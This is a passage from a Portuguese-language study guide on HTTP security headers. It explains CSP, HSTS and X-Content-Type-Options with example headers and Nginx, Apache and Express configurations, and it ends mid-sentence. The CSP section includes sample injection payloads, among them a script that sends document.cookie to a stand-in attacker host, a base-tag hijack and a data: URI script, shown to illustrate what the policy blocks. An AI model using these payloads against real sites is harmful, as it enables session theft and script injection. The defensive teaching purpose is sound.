> [⬅️ 4. Redes de Computadores e Portas](./04-redes-de-computadores.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [6 e 7. Checklist de Auditoria e Comparativo ➡️](./06-checklist-e-comparativo.md)

---

<a id="s5"></a>
## 5. Headers de Segurança HTTP

Os **Headers de Segurança HTTP** (cabeçalhos de segurança do *Hypertext Transfer Protocol* — Protocolo de Transferência de Hipertexto, padronizado na **RFC 9110**) são metadados enviados pelo servidor na resposta HTTP que instruem o navegador (*User-Agent*) a ativar mecanismos nativos de defesa, isolamento de contexto, restrição de recursos e controle de transporte. Eles atuam como uma camada essencial de **defesa em profundidade** (*defense in depth*): mesmo que uma aplicação apresente uma falha de codificação (como uma injeção de HTML), políticas rigorosas de cabeçalhos podem impedir que essa falha se transforme em uma exploração bem-sucedida no navegador do usuário.

Entretanto, um erro conceitual muito comum em provas acadêmicas, auditorias automatizadas e listas de verificação superficiais é tratar todos os headers de segurança como se fossem obrigatórios de forma idêntica em todo e qualquer endpoint. **Nem todos os headers são obrigatórios ou fazem sentido técnico em qualquer cenário.** A configuração correta depende diretamente da natureza do recurso retornado, do modelo de autenticação e dos requisitos funcionais da aplicação:

1. **Documentos HTML interativos vs. APIs puramente JSON**:
   - Uma página **HTML** (*HyperText Markup Language* — Linguagem de Marcação de Hipertexto) renderiza interface gráfica, carrega folhas de estilo, executa scripts e pode ser embutida em quadros (`<iframe>`). Nela, cabeçalhos como `Content-Security-Policy` (com diretivas de script e estilo), `Permissions-Policy`, `Cross-Origin-Opener-Policy` (COOP) e `Cross-Origin-Embedder-Policy` (COEP) têm papel central.
   - Já uma **API** (*Application Programming Interface* — Interface de Programação de Aplicações) **REST** (*Representational State Transfer* — Transferência de Estado Representacional) que retorna exclusivamente dados em **JSON** (*JavaScript Object Notation* — Notação de Objetos JavaScript) com `Content-Type: application/json` não renderiza documentos nem carrega sub-recursos. Ainda assim, enviar `X-Content-Type-Options: nosniff`, `Cache-Control: no-store` (para dados sensíveis), `Strict-Transport-Security`, `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` e `X-Frame-Options: DENY` em APIs é uma **[BOA PRÁTICA]** recomendada pelo guia da **OWASP** (*Open Worldwide Application Security Project* — Projeto Aberto Mundial de Segurança de Aplicações) para evitar que respostas JSON sejam interpretadas como HTML por *MIME sniffing* (dedução de tipo de mídia) ou carregadas dentro de `<iframe>` em navegadores legados.
2. **Páginas públicas cacheáveis vs. Painéis bancários/autenticados**:
   - Em um portal público de notícias ou em arquivos estáticos versionados (`app.8f9d2a.js`), o cabeçalho `Cache-Control: public, max-age=31536000, immutable` é desejável para desempenho e disponibilidade em **CDNs** (*Content Delivery Networks* — Redes de Distribuição de Conteúdo).
   - Em um painel bancário autenticado ou endpoint que retorna **PII** (*Personally Identifiable Information* — Informações Pessoais Identificáveis, como CPF, saldo ou prontuário médico), o uso de `Cache-Control: public` seria uma falha grave de segurança. Nesse contexto, `Cache-Control: no-store` (ou, no mínimo, `private, no-cache, max-age=0, must-revalidate`) passa a ser um **[REQUISITO]** para impedir que proxies reversos, CDNs ou computadores compartilhados retenham cópias dos dados confidenciais.
3. **Isolamento Cross-Origin (`crossOriginIsolated`) vs. Integração com serviços de terceiros**:
   - Aplicações que processam vídeo, áudio, jogos em **Wasm** (*WebAssembly*) ou editores gráficos pesados no navegador frequentemente precisam do objeto `SharedArrayBuffer` e de temporizadores de alta precisão (`performance.now()`). Para habilitá-los com segurança após a descoberta das vulnerabilidades de execução especulativa (*Spectre*), o navegador exige o estado de isolamento cruzado (`self.crossOriginIsolated === true`), obtido pela combinação de `Cross-Origin-Opener-Policy: same-origin` com `Cross-Origin-Embedder-Policy: require-corp` (ou `credentialless`).
   - Por outro lado, se um site de comércio eletrônico depende de pop-ups de autenticação **OAuth 2.0** (*Open Authorization 2.0*, **RFC 6749**), gateways de pagamento externos via `window.open()` ou anúncios de terceiros que não enviam `Cross-Origin-Resource-Policy` (CORP) nem cabeçalhos **CORS** (*Cross-Origin Resource Sharing* — Compartilhamento de Recursos de Origem Cruzada), aplicar `COOP: same-origin` e `COEP: require-corp` de maneira cega quebrará o fluxo de login e o carregamento de imagens externas.

| Contexto Arquitetural | Headers Essenciais (`[REQUISITO]` / `[RECOMENDAÇÃO]`) | Headers Contextuais ou Desnecessários |
| :--- | :--- | :--- |
| **Aplicação Web HTML Autenticada** (ex.: Internet Banking, ERP, Prontuário) | `Strict-Transport-Security`, `Content-Security-Policy` rigorosa, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer` (ou `strict-origin-when-cross-origin`), `Permissions-Policy`, `Cache-Control: no-store`, `COOP: same-origin` | `Access-Control-Allow-Origin` (só deve existir se houver consumo legítimo cross-origin via Fetch/XHR). |
| **API REST / GraphQL Autenticada** (`application/json`) | `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Cache-Control: no-store`, `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`, `X-Frame-Options: DENY`, `CORP: same-origin` (ou `same-site`) | Diretivas visuais de CSP (`style-src`, `font-src`, `img-src`), `Permissions-Policy` de hardware, `COEP`. |
| **Site Institucional / Blog Público** (HTML estático sem login) | `Strict-Transport-Security`, `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: strict-origin-when-cross-origin` | `Cache-Control: no-store` (prejudica o desempenho sem ganho de segurança, pois os dados já são públicos). |
| **Aplicação Web com `SharedArrayBuffer` / WebAssembly Multithread** | Todos os headers de aplicação HTML + obrigatoriamente `Cross-Origin-Opener-Policy: same-origin` e `Cross-Origin-Embedder-Policy: require-corp` (ou `credentialless`) | Integrações legadas baseadas em `<iframe>` ou imagens cross-origin sem suporte a CORP/CORS. |

> [!IMPORTANT]
> Cabeçalhos de segurança **não substituem** a correção da vulnerabilidade na origem do código. Por exemplo, o `Content-Security-Policy` mitiga o impacto de **XSS** (*Cross-Site Scripting* — Execução de Scripts entre Sites, detalhado em [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)), mas a aplicação continua tendo como **[REQUISITO]** sanitizar entradas e realizar codificação contextual de saída (*output encoding*).

A seguir, estudaremos em profundidade cada um dos 12 principais headers de segurança HTTP cobrados em provas e auditorias profissionais, analisando sua especificação técnica, diretivas, comportamento na aba [Network do Chrome DevTools](./02a-devtools-network.md#s2-1) e implementação prática em servidores **Nginx**, **Apache HTTP Server** e **Express (Node.js)**.

---

<a id="s5-1"></a>
### 5.1 Content-Security-Policy (CSP)

##### 1. O que faz
O cabeçalho **`Content-Security-Policy` (CSP)** — Política de Segurança de Conteúdo, padronizado pelo **W3C** (*World Wide Web Consortium*) em **CSP Level 2** e **CSP Level 3** — permite que o servidor declare explicitamente uma lista de permissões (*allowlist*), tokens criptográficos (*nonces*), resumos criptográficos (*hashes*) e regras estruturais sobre quais recursos (scripts, folhas de estilo, imagens, fontes, conexões de rede, quadros e objetos) o navegador está autorizado a carregar e executar em um determinado documento.

Sua finalidade primária é mitigar ataques de injeção de conteúdo no lado do cliente, especialmente **XSS** (*Cross-Site Scripting*) e injeção de marcação HTML/CSS para exfiltração de dados, além de substituir e aprimorar a proteção contra **Clickjacking** (*UI Redressing* — Redesenho de Interface) por meio da diretiva `frame-ancestors`.

O funcionamento do CSP baseia-se em **diretivas** separadas por ponto e vírgula (`;`). Quando uma diretiva de busca (*fetch directive*) específica não é declarada (como `script-src` ou `img-src`), o navegador recorre automaticamente ao valor definido na diretiva de fallback **`default-src`**. Contudo, diretivas que **não** pertencem à categoria de *fetch directives* — como `base-uri`, `form-action`, `frame-ancestors`, `upgrade-insecure-requests` e `require-trusted-types-for` — **não herdam** de `default-src` e precisam ser declaradas individualmente.

As principais diretivas que você deve dominar para a prova são:

- **`default-src`**: Define a política padrão (fallback) para todas as diretivas de busca (`*-src`) que não forem especificadas explicitamente. Exemplo: `default-src 'self'` restringe por padrão todos os sub-recursos à mesma origem do documento.
- **`script-src`**: Controla de onde scripts executáveis (JavaScript e WebAssembly) podem ser carregados e se blocos `<script>` inline ou funções dinâmicas como `eval()` são permitidos. É a diretiva mais crítica contra XSS.
- **`style-src`**: Restringe as origens permitidas para folhas de estilo **CSS** (*Cascading Style Sheets*) externas (`<link rel="stylesheet">`) e blocos `<style>` ou atributos `style="..."` inline.
- **`img-src`**: Define as origens válidas para o carregamento de imagens (`<img>`, `favicon`, `background-image` no CSS). Frequentemente inclui `'self'`, `data:` (para imagens Base64 embutidas) e domínios de CDN.
- **`connect-src`**: Restringe os destinos (URLs/origens) para os quais o código JavaScript da página pode abrir conexões programáticas via `fetch()`, **XHR** (`XMLHttpRequest`), **WebSockets** (`ws:` / `wss:`), **SSE** (*Server-Sent Events* — `EventSource`), `navigator.sendBeacon()` e `<a> ping`. É fundamental para impedir a exfiltração de dados roubados para o servidor de um atacante.
- **`font-src`**: Determina as origens autorizadas para o carregamento de arquivos de fontes tipográficas via regra `@font-face` do CSS.
- **`object-src`**: Controla o carregamento de plugins e objetos incorporados pelas tags `<object>`, `<embed>` e `<applet>`. Como plugins legados (como Flash ou Java Applets) representam enorme superfície de ataque, definir `object-src 'none'` é uma **[RECOMENDAÇÃO]** universal em políticas modernas.
- **`base-uri`**: Restringe quais URLs podem ser utilizadas no elemento HTML `<base href="...">`. **Não faz fallback para `default-src`**. Sem essa diretiva, um atacante que consiga injetar apenas tags HTML não-script (ataque de *Base Tag Hijacking*) pode injetar `<base href="https://atacante.exemplo.test/">`, fazendo com que todos os scripts subsequentes com caminhos relativos (`<script src="/js/app.js">`) sejam carregados a partir do domínio do invasor.
- **`form-action`**: Restringe os endpoints (URLs) para os quais formulários HTML (`<form action="...">`) da página podem submeter dados. **Não faz fallback para `default-src`**. Impede que um atacante injete um formulário falso na página ou altere o atributo `action` de um formulário legítimo para capturar senhas.
- **`frame-ancestors`**: Especifica quais origens (pais/ancestrais) têm permissão para embutir a página atual dentro de `<frame>`, `<iframe>`, `<embed>` ou `<object>`. **Não faz fallback para `default-src`**. Substitui o antigo header `X-Frame-Options` com suporte a múltiplas origens e esquemas.
- **`upgrade-insecure-requests`**: Instrui o navegador a reescrever automaticamente todas as URLs de sub-recursos e navegações `http://` da página para `https://` antes mesmo de disparar a requisição de rede, prevenindo falhas de **Mixed Content** (conteúdo misto, veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)).
- **`require-trusted-types-for`**: Com o valor `'script'`, obriga que todos os sumidouros perigosos do **DOM** (*Document Object Model* — Modelo de Objetos do Documento), como `element.innerHTML`, `document.write()` e `eval()`, aceitem exclusivamente objetos tipados e sanitizados (*TrustedHTML*, *TrustedScript*, *TrustedScriptURL*) criados por uma política de **Trusted Types**, bloqueando strings brutas e erradicando classes inteiras de **DOM-based XSS** (`[Varia por versão]` — suportado nativamente em navegadores baseados no Chromium e em processo de adoção nos demais motores).

Além das origens baseadas em domínio, o CSP moderno introduz mecanismos avançados de autorização de scripts:

- **`'nonce-<valor_base64>'`** (*Number Used Once*): O servidor gera um token criptograficamente aleatório (mínimo de 128 bits de entropia, codificado em Base64) **diferente a cada resposta HTTP** e o inclui tanto no header (`script-src 'nonce-rAnd0m1234567890=='`) quanto no atributo da tag HTML legítima (`<script nonce="rAnd0m1234567890==">`). Como um atacante que injeta `<script>alert(1)</script>` não consegue adivinhar o nonce gerado para aquela requisição específica, o script injetado é bloqueado pelo navegador.
- **Hashes SHA (`'sha256-...'`, `'sha384-...'`, `'sha512-...'`)**: Permitem autorizar um script ou estilo inline estático específico calculando o resumo criptográfico **SHA** (*Secure Hash Algorithm*) exato de seu conteúdo textual (incluindo espaços e quebras de linha). Se o conteúdo for alterado em um único caractere, o hash não coincidirá e a execução será negada.
- **`'strict-dynamic'`** (CSP Level 3): Quando combinado com um `nonce` ou `hash`, transfere a confiança do script inicial para quaisquer novos scripts que ele criar dinamicamente via DOM (por exemplo, `document.createElement('script')`), ao mesmo tempo em que faz o navegador **ignorar** listas de permissões por domínio (`https:`, `'self'`) e a palavra-chave `'unsafe-inline'`, mantendo a compatibilidade com navegadores antigos e bloqueando desvios (*bypasses*) de CSP via CDNs públicas ou endpoints **JSONP** (*JSON with Padding*).
- **Perigos de `'unsafe-inline'` e `'unsafe-eval'`**:
  - **`'unsafe-inline'`**: Reabilita a execução de qualquer bloco `<script>...</script>` inline, manipuladores de eventos em atributos HTML (`onload="..."`, `onerror="..."`) e URLs `javascript:`. Quando presente em `script-src` (sem um `nonce` ou `hash` que o anule), **neutraliza quase completamente a proteção do CSP contra XSS**, pois o atacante pode simplesmente injetar código inline.
  - **`'unsafe-eval'`**: Permite que strings de texto sejam compiladas e executadas como código JavaScript em tempo de execução por meio de `eval()`, `new Function()`, `setTimeout("string", 100)` e `setInterval("string", 100)`. Facilita a exploração de XSS caso o atacante consiga controlar os argumentos passados a essas funções.
- **Modo `Content-Security-Policy-Report-Only`**: Envia a política em modo de **simulação/monitoramento**. O navegador avalia todas as regras, registra os avisos de violação na aba [Console do DevTools](./02c-devtools-console.md#s2-3) e envia relatórios JSON para o endpoint configurado em `report-to` (ou no legado `report-uri`), **mas não bloqueia** o carregamento nem a execução de nenhum recurso. É a abordagem ideal para testar uma nova política em produção antes de ativar o bloqueio efetivo. Note que a diretiva `frame-ancestors` e `upgrade-insecure-requests` não têm efeito prático de proteção se enviadas apenas em `Report-Only`.

##### 2. Quando se aplica (contexto de uso)
- **[REQUISITO]** em todas as páginas HTML, aplicações **SPA** (*Single-Page Applications* — Aplicações de Página Única) e documentos **SVG** (*Scalable Vector Graphics*) que possam renderizar conteúdo ou executar scripts no navegador.
- **[BOA PRÁTICA]** em respostas de APIs REST (`application/json`), utilizando uma política minimalista (`Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`) como defesa em profundidade contra *MIME confusion* e *framing*.

##### 3. Exemplo prático
Considere uma página de checkout da aplicação `https://loja-ficticia.test` que utiliza um script inline legítimo autenticado por `nonce` e comunica-se via `fetch()` apenas com `https://api.loja-ficticia.test`:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; script-src 'nonce-9f8e7d6c5b4a3210fedcba98' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.loja-ficticia.test; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
```

No corpo HTML dessa mesma resposta:

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Checkout Seguro</title>
</head>
<body>
  <!-- ESTE SCRIPT EXECUTA: possui o nonce exato exigido pelo header -->
  <script nonce="9f8e7d6c5b4a3210fedcba98">
    console.log("Inicializando módulo de pagamento legítimo...");
  </script>

  <!-- ESTE SCRIPT É BLOQUEADO PELO NAVEGADOR: tentativa de XSS sem o nonce -->
  <script>
    fetch("https://atacante.exemplo.test/roubo?cookie=" + document.cookie);
  </script>
</body>
</html>
```

##### 4. Configuração recomendada
A literatura moderna de segurança (incluindo o Google Application Security e a OWASP) recomenda priorizar políticas **baseadas em Nonces ou Hashes com `'strict-dynamic'`** (*Strict CSP*) em vez de longas listas de domínios (*allowlists*), pois listas de domínios frequentemente incluem CDNs públicas (como `cdnjs.cloudflare.com` ou `unpkg.com`) que hospedam bibliotecas antigas vulneráveis (como versões legadas do AngularJS) capazes de contornar a política:

```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-{ALEATORIO_POR_REQUISICAO}' 'strict-dynamic' https: 'unsafe-inline'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.exemplo.test; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; require-trusted-types-for 'script'; upgrade-insecure-requests
```

> [!TIP]
> Observe que na configuração acima com `'strict-dynamic'` e `'nonce-...'`, os valores `https:` e `'unsafe-inline'` são incluídos **apenas para retrocompatibilidade** com navegadores muito antigos (CSP Level 1): qualquer navegador moderno (CSP Level 2 e 3) **ignora automaticamente** `'unsafe-inline'` quando vê um `nonce` ou `hash`, e **ignora** `https:` quando vê `'strict-dynamic'`.

##### 5. O que acontece quando está ausente
Quando o header `Content-Security-Policy` não é enviado pelo servidor:
- O navegador opera no modo padrão permissivo: qualquer script inline (`<script>...</script>`), manipulador de evento (`onerror=alert(1)`), chamada `eval()` ou script externo de qualquer domínio do mundo será carregado e executado sem restrições.
- Qualquer vulnerabilidade de injeção de HTML na aplicação converte-se imediatamente em um **XSS** totalmente explorável.
- Caso o código seja comprometido, o script malicioso pode enviar dados sensíveis (`localStorage`, tokens, dados digitados em formulários) para qualquer servidor externo via `fetch()`, `XMLHttpRequest`, `WebSocket` ou tags `<img>`.
- Se o cabeçalho `X-Frame-Options` também estiver ausente, a página poderá ser embutida em um `<iframe>` por qualquer site malicioso para ataques de **Clickjacking**.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Uso de `script-src 'unsafe-inline'` (sem nonce/hash)**: Permite a execução direta de scripts injetados no HTML, tornando o CSP ineficaz contra XSS refletido e armazenado.
- **Permissão de curingas amplos (`script-src *`, `script-src https:`, `default-src *`)**: Autoriza o atacante a carregar `<script src="https://atacante.exemplo.test/exploit.js"></script>` diretamente de seu próprio servidor.
- **Autorização de esquemas `data:` ou `blob:` em `script-src`**: Permite que um atacante injete `<script src="data:text/javascript,alert(document.domain)"></script>`, contornando restrições de domínio.
- **Reutilização do mesmo `nonce` entre requisições (nonce estático)**: Se o servidor fixar um nonce no arquivo de configuração ou armazená-lo em cache público na CDN, o atacante basta ler o nonce em uma requisição prévia e incluí-lo no payload de XSS. **[REQUISITO]**: o nonce deve ser gerado dinamicamente a cada requisição.
- **Esquecimento de `object-src 'none'` e `base-uri 'none'`**: Em uma política que declara apenas `script-src 'nonce-...'` sem definir `default-src`, `object-src` e `base-uri` ficam totalmente abertos, permitindo *Base Tag Hijacking* ou injeção de `<object>`.

##### 7. Como verificar na aba Network do DevTools
1. Abra o Chrome DevTools (`F12` ou `Ctrl+Shift+I`) e acesse a aba **[Network](./02a-devtools-network.md#s2-1)**.
2. Marque o filtro **Doc** (Documentos) e recarregue a página (`Ctrl+R`).
3. Clique na requisição principal do documento HTML (geralmente a primeira linha com status `200`) e abra a sub-aba **Headers** -> seção **Response Headers**.
4. Procure por `content-security-policy` ou `content-security-policy-report-only`.
5. Verifique também a aba **[Console](./02c-devtools-console.md#s2-3)**: sempre que o CSP bloquear um recurso, o navegador exibirá um erro em vermelho detalhando exatamente qual diretiva foi violada, por exemplo:
   `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.`

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx** (política estática baseada em origens para uma SPA sem scripts inline; para nonces dinâmicos, utiliza-se `$request_id` ou geração na aplicação de back-end):
```nginx
server {
    listen 443 ssl http2;
    server_name loja-ficticia.test;

    # O parâmetro 'always' garante o envio mesmo em respostas de erro (4xx/5xx)
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.loja-ficticia.test; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests" always;
}
```

**Apache HTTP Server** (requer o módulo `mod_headers` habilitado via `a2enmod headers`):
```apache
<VirtualHost *:443>
    ServerName loja-ficticia.test

    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.loja-ficticia.test; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests"
</VirtualHost>
```

**Express / Node.js** (gerando um `nonce` criptográfico exclusivo por requisição com o módulo nativo `crypto` e o pacote `helmet`):
```javascript
const express = require('express');
const crypto = require('crypto');
const helmet = require('helmet');

const app = express();

// 1. Middleware que gera um nonce de 16 bytes (128 bits) único por requisição
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// 2. Configuração do CSP usando Helmet e injetando o nonce dinâmico
app.use(
  helmet.contentSecurityPolicy({
    useDefaults: false,
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        (req, res) => `'nonce-${res.locals.cspNonce}'`,
        "'strict-dynamic'"
      ],
      styleSrc: ["'self'"],
      imgSrc: ["'self'", "data:"],
      fontSrc: ["'self'"],
      connectSrc: ["'self'", "https://api.loja-ficticia.test"],
      objectSrc: ["'none'"],
      baseUri: ["'none'"],
      formAction: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: []
    }
  })
);
```

---

<a id="s5-2"></a>
### 5.2 Strict-Transport-Security (HSTS)

##### 1. O que faz
O cabeçalho **`Strict-Transport-Security`** — conhecido pela sigla **HSTS** (*HTTP Strict Transport Security* — Segurança de Transporte Estrita do HTTP, padronizado na **RFC 6797**) — instrui o navegador a armazenar em cache uma política de transporte seguro para aquele domínio: durante todo o período especificado, o navegador **nunca mais deverá se conectar ao domínio utilizando HTTP em texto claro**, devendo converter internamente qualquer tentativa de acesso `http://` para `https://` e bloquear o usuário de prosseguir caso ocorra qualquer erro no certificado **TLS** (*Transport Layer Security* — Segurança da Camada de Transporte).

O HSTS foi projetado para derrotar ataques de **SSL Stripping** (remoção de SSL/TLS em ataques *Man-in-the-Middle* — MitM, onde um invasor na mesma rede Wi-Fi intercepta a primeira requisição `http://exemplo.test` antes que o redirecionamento `301 Moved Permanently` para `https://` aconteça) e impedir que usuários cliquem em *"Avançar mesmo assim"* diante de alertas de certificados falsos ou autoassinados.

Suas três diretivas são:
- **`max-age=<segundos>`** (obrigatória): Define por quantos segundos, a contar do recebimento da resposta, o navegador deve lembrar que este domínio só pode ser acessado via HTTPS. Cada vez que o navegador recebe novamente o header HSTS em uma conexão segura válida, esse cronômetro é renovado. Se `max-age=0` for enviado sobre HTTPS, o navegador apaga imediatamente a política HSTS armazenada para aquele host (desde que não esteja na lista de *preload*).
- **`includeSubDomains`** (opcional): Quando presente, estende a obrigatoriedade de HTTPS a **todos os subdomínios** atuais e futuros daquele domínio (ex.: se enviado por `exemplo.test`, aplica-se também a `api.exemplo.test`, `intranet.exemplo.test`, `dev.homolog.exemplo.test`).
- **`preload`** (opcional, convenção mantida pelos fabricantes de navegadores via `hstspreload.org`): Sinaliza que o proprietário do domínio autoriza a inclusão permanente do domínio na **HSTS Preload List** — uma lista embutida diretamente no código-fonte dos principais navegadores (Chrome, Firefox, Edge, Safari). Com o *preload*, até mesmo o **primeiro acesso da história** daquele navegador ao domínio (o chamado *Problema do Primeiro Acesso* ou **TOFU** — *Trust On First Use*) já nasce protegido em HTTPS, sem nenhuma requisição `http://` inicial.

> [!IMPORTANT]
> Pela **RFC 6797 (Seção 7.2)**, os navegadores **ignoram completamente** o cabeçalho `Strict-Transport-Security` se ele for recebido em uma conexão **HTTP sem criptografia** ou em uma conexão HTTPS cujo certificado TLS apresente erros de validação (como certificado expirado, autoassinado ou com nome de domínio divergente). Isso evita que um atacante na rede injete um HSTS malicioso para causar negação de serviço ao domínio.

##### 2. Quando se aplica (contexto de uso)
- **[REQUISITO]** em todas as respostas HTTPS de qualquer aplicação web moderna em produção (páginas HTML, APIs REST e servidores de autenticação).
- **Não deve ser enviado** em ambientes de desenvolvimento local (`http://localhost`) ou sistemas legados de intranet que ainda não possuem certificados TLS válidos para todos os seus serviços.

##### 3. Exemplo prático
Quando o usuário acessa `https://exemplo.test` pela primeira vez e o servidor responde com:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

Se, no dia seguinte, esse mesmo usuário clicar em um link legado `http://exemplo.test/login` ou digitar `http://api.exemplo.test` na barra de endereços em uma rede Wi-Fi pública hostil:
1. O navegador consulta seu banco de dados interno de HSTS antes de enviar qualquer pacote à placa de rede.
2. O navegador gera um **redirecionamento interno `307 Internal Redirect`** para `https://exemplo.test/login`.
3. A conexão já sai da máquina do usuário criptografada via TLS na porta `443`, frustrando qualquer tentativa de *SSL Stripping* na porta `80`.

##### 4. Configuração recomendada
Para domínios em produção que já operam 100% em HTTPS em todos os seus subdomínios e atendem aos requisitos de *preload* (2 anos = 63.072.000 segundos, ou no mínimo 1 ano = 31.536.000 segundos):

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

Caso a organização esteja iniciando a migração para HTTPS, a **[BOA PRÁTICA]** recomendada é uma **implantação gradual (em rampa)**:
1. Iniciar com `Strict-Transport-Security: max-age=300` (5 minutos, sem `includeSubDomains`) para monitorar falhas.
2. Aumentar progressivamente para 1 semana (`max-age=604800`) e 1 mês (`max-age=2592000`).
3. Somente após auditar **todos** os subdomínios (incluindo sistemas internos, impressoras, servidores de homologação e subdomínios de terceiros), ativar `max-age=31536000; includeSubDomains` e, por fim, `preload`.

##### 5. O que acontece quando está ausente
- Sempre que o usuário digitar apenas o nome do domínio ou clicar em um link `http://`, o navegador poderá tentar uma conexão inicial na porta `80` (HTTP em texto claro) antes de ser redirecionado pelo servidor para `https://`.
- Um atacante posicionado na mesma rede local (via **ARP Spoofing** ou ponto de acesso Wi-Fi falso, veja [Redes de Computadores](./04-redes-de-computadores.md#s4)) pode interceptar essa primeira requisição HTTP, impedir o redirecionamento para HTTPS e atuar como intermediário (*SSL Stripping*), lendo senhas e cookies de sessão caso estes também não tenham o atributo `Secure`.
- Caso um atacante apresente um certificado TLS falso, o navegador exibirá a tela de aviso, mas ainda oferecerá ao usuário a opção de ignorar o alerta e prosseguir para o site inseguro.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Ativação prematura de `includeSubDomains` e `preload` (Risco Crítico de Disponibilidade)**: Se o administrador configurar `max-age=63072000; includeSubDomains; preload` no domínio raiz `empresa.test`, mas existir um sistema legado em `http://erp-antigo.empresa.test` ou `https://intranet.empresa.test` com certificado expirado/autoassinado, **todos os usuários que visitarem o site principal ficarão impedidos pelo navegador de acessar os subdomínios legados** pelos próximos 2 anos (e, com `preload`, a remoção da lista dos navegadores pode levar meses).
- **`max-age` muito curto em produção (ex.: `max-age=3600`)**: A proteção expira após 1 hora de inatividade; no próximo acesso do usuário no dia seguinte, a primeira requisição volta a estar vulnerável ao *SSL Stripping*.
- **Envio do header apenas na porta `80` (HTTP)**: Como o navegador ignora HSTS sobre HTTP, a configuração não surte absolutamente nenhum efeito. O servidor na porta `80` deve apenas responder com `301 Moved Permanently` para `https://`, e o servidor na porta `443` (HTTPS) é quem deve enviar o cabeçalho `Strict-Transport-Security`.

##### 7. Como verificar na aba Network do DevTools
1. Na aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools, acesse a página via `https://` e inspecione os **Response Headers** da requisição principal: confirme a presença de `strict-transport-security` com um `max-age` de pelo menos `31536000` (1 ano).
2. Para testar o comportamento prático no DevTools: marque a opção **Preserve log** na aba Network e tente navegar para `http://loja-ficticia.test` (com `http://`). Você verá uma linha com status **`307 Internal Redirect`** (com o header sintético `Non-Authoritative-Reason: HSTS`), seguida imediatamente pela requisição `https://`.
3. Adicionalmente, no Google Chrome, é possível consultar e depurar o estado interno do HSTS e do Preload para qualquer domínio acessando a página interna `chrome://net-internals/#hsts`.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
# Bloco HTTP (Porta 80): apenas redireciona permanentemente para HTTPS
server {
    listen 80;
    server_name loja-ficticia.test www.loja-ficticia.test;
    return 301 https://$host$request_uri;
}

# Bloco HTTPS (Porta 443): envia o header HSTS
server {
    listen 443 ssl http2;
    server_name loja-ficticia.test;

    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:80>
    ServerName loja-ficticia.test
    Redirect permanent / https://loja-ficticia.test/
</VirtualHost>

<VirtualHost *:443>
    ServerName loja-ficticia.test
    SSLEngine on
    # ... configuração dos certificados TLS ...

    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Configura Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
app.use(
  helmet.hsts({
    maxAge: 63072000,        // 2 anos em segundos
    includeSubDomains: true,
    preload: true
  })
);
```

---

<a id="s5-3"></a>
### 5.3 X-Content-Type-Options

##### 1. O que faz
O cabeçalho **`X-Content-Type-Options`** — padronizado no **Fetch Standard** e no **MIME Sniffing Standard** do **WHATWG** (*Web Hypertext Application Technology Working Group*) — aceita um único valor válido, a diretiva **`nosniff`**, cuja função é proibir o navegador de realizar **MIME Sniffing** (dedução heurística do tipo de mídia).

Historicamente, os navegadores tentavam "ajudar" servidores mal configurados: se um servidor entregasse um arquivo com `Content-Type: text/plain` ou `application/octet-stream`, o navegador inspecionava os primeiros bytes do corpo da resposta (*magic bytes* ou tags iniciais como `<html>`, `<script>`) e, caso parecessem HTML ou JavaScript, ignorava o `Content-Type` declarado pelo servidor e renderizava/executava o arquivo.

Embora parecesse conveniente, o *MIME sniffing* abriu uma brecha gravíssima em funcionalidades de **upload de arquivos** (veja [Vulnerabilidades Web](./03a-vulnerabilidades-parte1.md#s3)): um atacante enviava um arquivo chamado `foto_perfil.jpg` ou `relatorio.txt` contendo código HTML/JavaScript (`<script>...</script>`). Mesmo que o servidor o servisse como `Content-Type: text/plain` ou `image/jpeg`, o navegador farejava as tags HTML e executava o script no contexto da origem da aplicação (**Stored XSS**).

Quando **`X-Content-Type-Options: nosniff`** está presente:
